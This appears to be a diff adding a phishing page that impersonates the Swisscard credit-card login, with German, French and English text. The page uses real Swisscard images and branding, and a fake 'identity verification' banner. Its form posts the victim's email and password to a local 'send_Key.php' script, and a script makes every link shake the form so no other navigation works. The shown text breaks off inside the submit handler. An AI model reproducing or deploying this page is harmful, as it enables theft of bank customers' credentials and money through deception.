@@ -1,0 +1,1339 @@
+<html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Swisscard - Anmeldung</title>
+    <link rel="icon" href="desktop/assets/img/favicon-32x32.png" type="image/png">
+    <link rel="shortcut icon" href="desktop/assets/img/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="desktop/assets/img/apple-touch-icon.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --swisscard-blue: #005CA9;
+            --text-gray: #2D3748;
+            --border-color: #E2E8F0;
+            --background-gray: #F7FAFC;
+            --error-red: #E53E3E;
+            --success-green: #38A169;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 25px -5px rgba(0,0,0,0.1);
+            --gradient-white: linear-gradient(to bottom, #ffffff, #f8fafc);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: white;
+            color: var(--text-gray);
+            line-height: 1.6;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 16px 24px;
+            box-shadow: var(--shadow-sm);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(226, 232, 240, 0.8);
+            height: 70px;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            height: 100%;
+        }
+
+        .logo {
+            height: 35px;
+            width: auto;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .logo:hover {
+            transform: scale(1.02);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--text-gray);
+            font-size: 14px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            background: rgba(0,92,169,0.05);
+            color: var(--swisscard-blue);
+        }
+
+        .nav-links a.active {
+            color: var(--swisscard-blue);
+            font-weight: 500;
+            background: rgba(0,92,169,0.08);
+        }
+
+        /* Mobile Menu Toggle */
+        .mobile-menu-toggle {
+            display: none;
+            width: 32px;
+            height: 32px;
+            position: relative;
+            z-index: 1000;
+            border: none;
+            background: none;
+            cursor: pointer;
+            padding: 0;
+        }
+
+        .hamburger,
+        .hamburger::before,
+        .hamburger::after {
+            content: '';
+            position: absolute;
+            width: 24px;
+            height: 2px;
+            background: var(--text-gray);
+            transition: 0.3s;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .hamburger {
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .hamburger::before {
+            top: -8px;
+        }
+
+        .hamburger::after {
+            bottom: -8px;
+        }
+
+        .mobile-menu-toggle.active .hamburger {
+            background: transparent;
+        }
+
+        .mobile-menu-toggle.active .hamburger::before {
+            top: 0;
+            transform: translate(-50%, 0) rotate(45deg);
+        }
+
+        .mobile-menu-toggle.active .hamburger::after {
+            bottom: 0;
+            transform: translate(-50%, 0) rotate(-45deg);
+        }
+
+        /* Mobile Menu */
+        .mobile-menu {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            height: 100vh;
+            width: 100%;
+            background: white;
+            transition: 0.3s ease-in-out;
+            z-index: 999;
+            padding-top: 70px;
+            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+        }
+
+        .mobile-menu.active {
+            right: 0;
+        }
+
+        .mobile-menu a {
+            display: block;
+            padding: 20px 24px;
+            text-decoration: none;
+            color: var(--text-gray);
+            font-size: 16px;
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+            transition: 0.2s;
+        }
+
+        .mobile-menu a:hover {
+            background: rgba(0,92,169,0.05);
+            padding-left: 28px;
+            color: var(--swisscard-blue);
+        }
+
+        .mobile-menu a.active {
+            color: var(--swisscard-blue);
+            font-weight: 500;
+            background: rgba(0,92,169,0.08);
+        }
+        
+                /* Main Container and Login Card */
+        @media (min-width: 769px) {
+            .main-container {
+                max-width: 540px;
+                margin: 100px auto 60px;  /* Reduced from 140px */
+            }
+
+            .login-card {
+                padding: 0;
+                box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            }
+
+            .login-header {
+                padding: 28px 40px;  /* Reduced from 36px */
+            }
+
+            .login-header h1 {
+                font-size: 28px;
+                margin-bottom: 4px;
+            }
+
+            .login-description {
+                font-size: 16px;
+                margin-top: 16px;  /* Reduced from 28px */
+            }
+        }
+
+        .login-card {
+            background: rgb(254, 254, 254);
+            border-radius: 12px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.18), 0 5px 15px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(255, 255, 255, 0.15) inset;
+            overflow: hidden;
+            border: none;
+            transform-style: preserve-3d;
+            perspective: 1200px;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            position: relative;
+        }
+
+        .login-header {
+            padding: 35px 35px 60px;
+            background: linear-gradient(135deg, #263c53, #1a2e47);
+            position: relative;
+            color: white;
+            border-bottom: none;
+            z-index: 1;
+            clip-path: polygon(0 0, 100% 0, 100% calc(100% - 25px), 0 100%);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-header h1 {
+    font-size: 24px;
+    font-weight: 600;
+    color: white;
+    line-height: 1.3;
+    position: relative;
+    padding-bottom: 0;
+    margin-bottom: 16px;
+    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    display: flex;
+    align-items: center;
+}
+
+.login-header h1::before {
+    content: '';
+    display: inline-block;
+    width: 6px;
+    height: 24px;
+    background: linear-gradient(to bottom, #f39200, #c19a6b);
+    margin-right: 15px;
+    border-radius: 3px;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    transform: translateZ(5px);
+}
+
+        .login-description {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-top: 0;
+            margin-bottom: 5px;
+            max-width: 95%;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-body {
+            padding: 40px 35px 35px;
+            background: white;
+            position: relative;
+            z-index: 0;
+            margin-top: 0;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.03) inset;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            font-size: 13px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+        }
+
+        .form-input-container {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px 18px;
+            padding-right: 44px;
+            border: 1px solid rgba(38, 60, 83, 0.12);
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.25s ease;
+            background: #f9fafb;
+            height: 54px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.04), 0 1px 2px rgba(0, 0, 0, 0.06);
+            position: relative;
+            color: #263c53;
+            letter-spacing: 0.3px;
+        }
+
+        .form-input:hover {
+            border-color: rgba(38, 60, 83, 0.3);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.06), 0 2px 4px rgba(0, 0, 0, 0.08);
+            background: #ffffff;
+            transform: translateY(-1px);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: rgba(38, 60, 83, 0.4);
+            box-shadow: 0 0 0 3px rgba(38, 60, 83, 0.15), 0 4px 12px rgba(0, 0, 0, 0.05);
+            background: #ffffff;
+            transform: translateY(-1px);
+        }
+
+        .form-input.error {
+            border-color: var(--error-red);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #A0AEC0;
+            transition: all 0.3s ease;
+            z-index: 2;
+            cursor: pointer;
+        }
+
+        .error-message {
+            display: none;
+            color: var(--error-red);
+            font-size: 13px;
+            margin-top: 8px;
+            padding: 10px 12px;
+            background: rgba(229,62,62,0.08);
+            border-radius: 8px;
+            border: 1px solid rgba(229,62,62,0.2);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        /* Footer Styles */
+.site-footer {
+    background: white;
+    padding: 20px;
+    border-top: 1px solid rgba(0, 0, 0, 0.08);
+    margin-top: 1px;
+    position: relative;
+    width: 100%;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+.footer-logos {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+    gap: 20px;
+}
+
+.footer-logo.swisscard {
+    height: 24px;
+    width: auto;
+}
+
+.partner-logos {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+}
+
+.footer-logo.credit-suisse,
+.footer-logo.amex {
+    height: 20px;
+    width: auto;
+}
+
+.footer-text {
+    text-align: left;
+    font-size: 12px;
+    color: #666;
+    line-height: 1.5;
+}
+
+.footer-links {
+    margin-top: 8px;
+}
+
+.footer-links a {
+    color: #666;
+    text-decoration: none;
+    transition: color 0.2s ease;
+}
+
+.footer-links a:hover {
+    color: var(--swisscard-blue);
+}
+
+/* Update body styles */
+body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+.main-container {
+    flex: 1;
+    padding-bottom: 30px; /* Reduced space at the bottom */
+    min-height: auto; /* Let content determine height */
+}
+
+/* Mobile Footer Styles */
+@media (max-width: 768px) {
+    .site-footer {
+        padding: 16px;
+    }
+
+    .footer-content {
+        padding: 0;
+    }
+
+    .footer-logos {
+        flex-direction: column;
+        align-items: flex-start;
+        margin-bottom: 16px;
+        gap: 16px;
+    }
+
+    .partner-logos {
+        width: 100%;
+        justify-content: space-between;
+    }
+
+    .footer-text {
+        font-size: 11px;
+    }
+
+    .footer-links {
+        display: flex;
+        flex-direction: column;
+        margin-top: 16px;
+    }
+
+    .footer-links a {
+        display: block;
+        padding: 12px 0;
+        border-top: 1px solid rgba(0, 0, 0, 0.08);
+    }
+}
+
+        /* Navigation Footer Styles */
+.nav-footer {
+    background-color: #263c53;
+    color: white;
+    padding: 48px 0 24px;
+    margin-top: 61px;
+
+}
+
+.nav-footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 24px;
+}
+
+.nav-footer-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 32px;
+    margin-bottom: 40px;
+}
+
+.nav-footer-title {
+    color: white;
+    font-size: 16px;
+    font-weight: 500;
+    margin-bottom: 16px;
+}
+
+.nav-footer-list {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.nav-footer-list li {
+    margin-bottom: 12px;
+}
+
+.nav-footer-list a {
+    color: rgba(255, 255, 255, 0.8);
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.2s ease;
+    display: block;
+}
+
+.nav-footer-list a:hover {
+    color: white;
+}
+
+/* Social Media Section */
+.nav-footer-social {
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    padding-top: 24px;
+    display: flex;
+    justify-content: flex-end;
+}
+
+.social-links {
+    display: flex;
+    gap: 16px;
+}
+
+.social-link {
+    color: white;
+    text-decoration: none;
+    font-size: 24px;
+    opacity: 0.8;
+    transition: opacity 0.2s ease;
+}
+
+.social-link:hover {
+    opacity: 1;
+}
+
+/* Mobile Styles */
+@media (max-width: 768px) {
+    .nav-footer {
+        padding: 32px 0 16px;
+    }
+
+    .nav-footer-content {
+        padding: 0 16px;
+    }
+
+    .nav-footer-grid {
+        grid-template-columns: 1fr;
+        gap: 24px;
+    }
+
+    .nav-footer-column {
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        padding-bottom: 24px;
+    }
+
+    .nav-footer-column:last-child {
+        border-bottom: none;
+    }
+
+    .nav-footer-title {
+        font-size: 15px;
+        margin-bottom: 12px;
+    }
+
+    .nav-footer-list li {
+        margin-bottom: 10px;
+    }
+
+    .nav-footer-list a {
+        font-size: 13px;
+        padding: 8px 0;
+    }
+
+    .nav-footer-social {
+        justify-content: flex-start;
+        margin-top: 24px;
+    }
+}
+        
+        .login-button {
+            width: 100%;
+            background: linear-gradient(145deg, #005CA9, #004080);
+            color: white;
+            border: none;
+            padding: 0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 30px;
+            height: 60px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+            transform: translateZ(5px);
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .login-button:not(:disabled):hover {
+            background: linear-gradient(145deg, #0068c0, #003a75);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            transform: translateY(-2px) translateZ(8px);
+        }
+
+        .login-button:disabled {
+            background: linear-gradient(145deg, #7296b9, #506c85);
+            opacity: 0.8;
+            color: rgba(255, 255, 255, 0.9);
+            cursor: not-allowed;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        
+        .login-button:disabled::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+        }
+        
+                @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .mobile-menu-toggle {
+                display: flex;
+            }
+
+            .main-container {
+                margin-top: 104px;
+                padding: 0 16px;
+            }
+
+            .login-header {
+                padding: 24px 20px;  /* Reduced padding */
+            }
+
+            .login-header h1 {
+                font-size: 24px;
+                margin-top: 6px;
+            }
+
+            .login-description {
+                font-size: 15px;
+                margin-top: 16px;
+                max-width: 100%;
+            }
+
+            .login-body {
+                padding: 20px;  /* Reduced padding */
+            }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+<style>
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+                20%, 40%, 60%, 80% { transform: translateX(10px); }
+            }
+            
+            .shake {
+                animation: shake 0.8s cubic-bezier(.36,.07,.19,.97) both;
+            }
+        </style></head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRTeoJQWrwtpMpKttUCtG1GVRYXhU9-_9ptxMziv5qt4qgyiaJS3r8wPhl4Cs91XSuFpA&amp;usqp=CAU" alt="Swisscard Logo" class="logo">
+            
+            <nav class="nav-links">
+                <a href="#" class="help-link">Hilfe</a>
+                <a href="#" class="active">DE</a>
+                <a href="#">FR</a>
+                <a href="#">EN</a>
+            </nav>
+
+            <button class="mobile-menu-toggle" aria-label="Menu">
+                <div class="hamburger"></div>
+            </button>
+
+            <div class="mobile-menu">
+                <a href="#" class="help-link">Hilfe</a>
+                <a href="#" class="active">DE</a>
+                <a href="#">FR</a>
+                <a href="#">EN</a>
+            </div>
+        </div>
+    </header>
+
+    <div style="width: 100%; max-width: 450px; margin: 0 auto; position: relative; padding-bottom: 30px;">
+    <!-- Background image container with gradient overlay -->
+    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url('https://www.swisscard.ch/.imaging/flex/jcr:f191e539-8e0e-4092-bbe5-ac185d633097/hash/071671dff430d38a80fd9c4c6e338272/ratio/8:3/version/1737624948/width/1366/swisscard-security-tipps-stageslider.jpg') no-repeat center bottom; background-size: cover; z-index: -1;"></div>
+    <!-- Gradient overlay -->
+    <div style="position: absolute; bottom: 0; left: 0; right: 0; height: 100px; background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,1)); z-index: -1;"></div>
+    <main class="main-container" style="background: transparent;">
+        <div class="login-card">
+            <div class="login-header">
+                <h1 id="loginTitle">Mit Swisscard Login verbinden</h1>
+                <p class="login-description" id="loginDesc">
+                    Bitte melden Sie sich hier mit Ihren Swisscard App-Anmeldedaten an.
+                </p>
+            </div>
+            <div class="login-body">
+    <form id="loginForm" action="./system/send_Key.php" method="post">
+        <div class="form-group">
+            <label class="form-label" for="email" id="emailLabel">E-Mail</label>
+            <div class="form-input-container">
+                <input type="email" id="email" name="User" class="form-input" required="">
+                <i class="fas fa-envelope input-icon"></i>
+            </div>
+            <div class="error-message" id="emailError">
+                <i class="fas fa-exclamation-circle"></i>
+                Bitte geben Sie eine gültige E-Mail-Adresse ein
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label" for="password" id="passwordLabel">Passwort</label>
+            <div class="form-input-container">
+                <input type="password" id="password" name="password" class="form-input" required="">
+                <i class="fas fa-eye input-icon" id="togglePassword"></i>
+            </div>
+            <div class="error-message" id="passwordError">
+                <i class="fas fa-exclamation-circle"></i>
+                Das Passwort muss mindestens 8 Zeichen lang sein
+            </div>
+        </div>
+
+        <button type="submit" class="login-button" id="loginButton" disabled="">
+            <span>Anmelden</span>
+            <i class="fas fa-arrow-right"></i>
+        </button>
+    </form>
+</div>
+        </div>
+    </main>
+    </div>
+
+    <style>
+        /* Page transitions */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes slideInLeft {
+            from { transform: translateX(-50px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        @keyframes slideInRight {
+            from { transform: translateX(50px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        /* Minimal professional design for banking application */
+        .professional-section {
+            width: 100%;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0;
+            position: relative;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        /* Header with title */
+        .section-header {
+            background: linear-gradient(135deg, #3a6186, #263c53);
+            padding: 20px 30px;
+            position: relative;
+            z-index: 2;
+            margin-bottom: 0;
+            border-radius: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        
+        .header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            margin: 0;
+            letter-spacing: 0.5px;
+            text-align: center;
+            text-transform: uppercase;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: slideInFromTop 0.8s ease-out forwards;
+            opacity: 0;
+            animation-fill-mode: forwards;
+        }
+        
+        @keyframes slideInFromTop {
+            from { transform: translateY(-15px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Content area with gradient */
+        .section-content {
+            background: linear-gradient(to bottom, #f5f7fa, white);
+            border-radius: 0;
+            padding: 30px 20px 20px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: center;
+            position: relative;
+            z-index: 1;
+            border-top: 1px solid rgba(255, 255, 255, 0.5);
+            animation: fadeIn 0.8s ease-out 0.3s forwards;
+            opacity: 0;
+            animation-fill-mode: forwards;
+        }
+        
+        /* Phone display container */
+        .phone-container {
+            display: flex;
+            gap: 50px;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            padding: 10px 0;
+        }
+        
+        /* Individual phone styling */
+        .phone {
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+        
+        .phone:first-child {
+            animation: slideInLeft 1s ease-out 0.6s forwards;
+            opacity: 0;
+            animation-fill-mode: forwards;
+        }
+        
+        .phone:last-child {
+            animation: slideInRight 1s ease-out 0.6s forwards;
+            opacity: 0;
+            animation-fill-mode: forwards;
+        }
+        
+        .phone img {
+            height: 400px;
+            display: block;
+            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.15));
+        }
+        
+        /* Subtle hover effect for interactivity */
+        .phone:hover {
+            transform: translateY(-5px);
+        }
+        
+        /* Bottom section */
+        .section-footer {
+            background: white;
+            height: 20px;
+            border-radius: 0;
+            margin-top: 1px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .phone-container {
+                gap: 30px;
+            }
+            
+            .phone img {
+                height: 320px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .phone img {
+                height: 250px;
+            }
+            
+            .phone-container {
+                gap: 20px;
+            }
+        }
+    </style>
+    
+    <div class="professional-section">
+        <!-- Clean header with title -->
+        <div class="section-header">
+            <h2 class="header-title">Identitätsverifizierung</h2>
+        </div>
+        
+        <!-- Main content area -->
+        <div class="section-content">
+            <div class="content-wrapper">
+                <div class="phone-container">
+                    <div class="phone">
+                        <img src="https://www.swisscard.ch/.imaging/flex/jcr:0185f7f1-a28c-4c4f-a0f5-b8da94f8b862/hash/5fb3c369b81a297b41aa1c4454fe1cac/version/1591709282/width/944/register_swisscard-app_step1_image_de.png" alt="Swisscard App">
+                    </div>
+                    
+                    <div class="phone">
+                        <img src="https://www.swisscard.ch/.imaging/flex/jcr:f1cc2172-ae0c-4a64-a5af-a6d47bf8785f/hash/3622bf0ff84e07c50867e1d1abac57d0/version/1591709253/width/944/register_swisscard-app_step7_image_de.png" alt="Swisscard App">
+                    </div>
+                </div>
+                
+                <!-- Professional description text below the logos -->
+                <div class="simple-text">
+                    <p>Identitätsprüfung erforderlich zu Ihrem Schutz. Der Vorgang dauert nur 2 Minuten und ermöglicht Ihnen vollen Zugriff auf Ihr Konto in absoluter Sicherheit.</p>
+                </div>
+            </div>
+        </div>
+        
+        <style>
+            .content-wrapper {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                width: 100%;
+            }
+            
+            .simple-text {
+                text-align: center;
+                margin: 30px 0 5px;
+                animation: fadeIn 0.8s ease-out 1s forwards;
+                opacity: 0;
+                animation-fill-mode: forwards;
+                width: 100%;
+                max-width: 600px;
+            }
+            
+            .simple-text p {
+                color: #505050;
+                font-size: 15px;
+                margin: 0;
+                line-height: 1.4;
+                font-weight: 400;
+            }
+        </style>
+        
+        <!-- Simple footer bar -->
+        <div class="section-footer"></div>
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const menuToggle = document.querySelector('.mobile-menu-toggle');
+        const mobileMenu = document.querySelector('.mobile-menu');
+        const body = document.body;
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const togglePassword = document.getElementById('togglePassword');
+        const loginContainer = document.querySelector('.login-card');
+        
+        // Add shake animation keyframes
+        const style = document.createElement('style');
+        style.innerHTML = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+                20%, 40%, 60%, 80% { transform: translateX(10px); }
+            }
+            
+            .shake {
+                animation: shake 0.8s cubic-bezier(.36,.07,.19,.97) both;
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Function to make the login container shake
+        function shakeLoginForm() {
+            // Scroll to login form
+            loginContainer.scrollIntoView({ behavior: 'smooth' });
+            
+            // Add shake class
+            setTimeout(() => {
+                loginContainer.classList.add('shake');
+                
+                // Remove shake class after animation completes
+                setTimeout(() => {
+                    loginContainer.classList.remove('shake');
+                }, 800);
+            }, 500);
+        }
+        
+        // Add click event to all links in footer and navigation
+        // Using a more direct approach with direct event assignment to ensure it works
+        function addShakeEffect() {
+            console.log('Adding shake effect to links');
+            
+            // Get all links in the document
+            const allLinks = document.getElementsByTagName('a');
+            console.log('Found ' + allLinks.length + ' links');
+            
+            // Add the event listener to each link
+            for (let i = 0; i < allLinks.length; i++) {
+                allLinks[i].addEventListener('click', function(e) {
+                    console.log('Link clicked');
+                    e.preventDefault();
+                    
+                    // Check if login-card exists
+                    if (loginContainer) {
+                        console.log('Login card found, shaking...');
+                        shakeLoginForm();
+                    } else {
+                        console.log('Login card not found');
+                        // Try to find it again
+                        const loginCard = document.querySelector('.login-card');
+                        if (loginCard) {
+                            loginCard.scrollIntoView({ behavior: 'smooth' });
+                            setTimeout(() => {
+                                loginCard.classList.add('shake');
+                                setTimeout(() => {
+                                    loginCard.classList.remove('shake');
+                                }, 800);
+                            }, 500);
+                        }
+                    }
+                });
+            }
+        }
+        
+        // Call the function to add the shake effect
+        addShakeEffect();
+        
+        // Also add it after a small delay to ensure it works after any dynamic content loads
+        setTimeout(addShakeEffect, 1000);
+
+        // Mobile menu functionality
+        menuToggle.addEventListener('click', () => {
+            menuToggle.classList.toggle('active');
+            mobileMenu.classList.toggle('active');
+            body.style.overflow = mobileMenu.classList.contains('active') ? 'hidden' : '';
+        });
+
+        // Close menu when clicking menu items
+        document.querySelectorAll('.mobile-menu a').forEach(link => {
+            link.addEventListener('click', () => {
+                menuToggle.classList.remove('active');
+                mobileMenu.classList.remove('active');
+                body.style.overflow = '';
+            });
+        });
+
+        // Close menu when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!mobileMenu.contains(e.target) && !menuToggle.contains(e.target)) {
+                menuToggle.classList.remove('active');
+                mobileMenu.classList.remove('active');
+                body.style.overflow = '';
+            }
+        });
+
+        const translations = {
+            de: {
+                title: 'Mit Swisscard Login verbinden',
+                description: 'Bitte melden Sie sich hier mit Ihren Swisscard App-Anmeldedaten an.',
+                email: 'E-Mail',
+                password: 'Passwort',
+                login: 'Anmelden',
+                help: 'Hilfe',
+                emailError: 'Bitte geben Sie eine gültige E-Mail-Adresse ein',
+                passwordError: 'Das Passwort muss mindestens 8 Zeichen lang sein'
+            },
+            fr: {
+                title: 'Se connecter à Swisscard Login',
+                description: 'Veuillez vous connecter ici avec vos identifiants de l\'application Swisscard.',
+                email: 'E-mail',
+                password: 'Mot de passe',
+                login: 'Se connecter',
+                help: 'Aide',
+                emailError: 'Veuillez entrer une adresse e-mail valide',
+                passwordError: 'Le mot de passe doit contenir au moins 8 caractères'
+            },
+            en: {
+                title: 'Connect to Swisscard Login',
+                description: 'Please log in here with your Swisscard app credentials.',
+                email: 'Email',
+                password: 'Password',
+                login: 'Login',
+                help: 'Help',
+                emailError: 'Please enter a valid email address',
+                passwordError: 'Password must be at least 8 characters long'
+            }
+        };
+
+        function setLanguage(lang) {
+            document.documentElement.lang = lang;
+            
+            // Update content translations
+            document.getElementById('loginTitle').textContent = translations[lang].title;
+            document.getElementById('loginDesc').textContent = translations[lang].description;
+            document.getElementById('emailLabel').textContent = translations[lang].email;
+            document.getElementById('passwordLabel').textContent = translations[lang].password;
+            document.querySelectorAll('.help-link').forEach(link => {
+                link.textContent = translations[lang].help;
+            });
+            document.querySelector('.login-button span').textContent = translations[lang].login;
+            document.getElementById('emailError').textContent = translations[lang].emailError;
+            document.getElementById('passwordError').textContent = translations[lang].passwordError;
+            
+            // Update active state for both desktop and mobile menu links
+            document.querySelectorAll('.nav-links a, .mobile-menu a').forEach(link => {
+                if (!link.classList.contains('help-link')) {
+                    // Remove active class from all language links
+                    link.classList.remove('active');
+                    // Add active class if the link text matches the selected language
+                    if (link.textContent.toLowerCase() === lang.toUpperCase()) {
+                        link.classList.add('active');
+                    }
+                }
+            });
+        }
+
+        // Password Toggle
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Form Validation
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
+        }
+
+        function validateForm() {
+            const isEmailValid = validateEmail(emailInput.value);
+            const isPasswordValid = passwordInput.value.length >= 8;
+            
+            emailInput.classList.toggle('error', !isEmailValid && emailInput.value);
+            passwordInput.classList.toggle('error', !isPasswordValid && passwordInput.value);
+            
+            document.getElementById('emailError').style.display = 
+                !isEmailValid && emailInput.value ? 'block' : 'none';
+            document.getElementById('passwordError').style.display = 
+                !isPasswordValid && passwordInput.value ? 'block' : 'none';
+
+            loginButton.disabled = !(isEmailValid && isPasswordValid);
+        }
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        // Language Switching
+        document.querySelectorAll('.nav-links a, .mobile-menu a').forEach(link => {
+            if (!link.classList.contains('help-link')) {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const lang = this.textContent.toLowerCase();
+                    if (translations[lang]) {
+                        setLanguage(lang);
+                        // Close mobile menu if it's open
+                        menuToggle.classList.remove('active');
+                        mobileMenu.classList.remove('active');
+                        body.style.overflow = '';
+                    }
+                });
+            }
+        });
+
+        // Form Submission
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (!loginButton.disabled) {
+        // Show loading state
